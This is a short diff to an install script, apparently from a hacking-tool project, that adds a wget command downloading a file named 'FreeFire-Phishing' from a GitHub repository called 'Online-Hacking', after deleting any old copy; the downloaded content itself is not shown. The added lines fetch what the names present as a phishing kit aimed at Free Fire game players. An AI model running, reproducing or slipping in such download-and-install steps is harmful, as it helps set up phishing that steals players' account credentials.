@@ -103,6 +103,8 @@ apt-get install ruby -y
 apt install gem -y
 gem install lolcat
 apt install gnome-terminal -y
+rm -rf FreeFire-Phishing
+wget https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/FreeFire/SM/FreeFire-Phishing
 clear
 echo""
 echo -e "\e[1;96m========================================================= > > >\e[m "
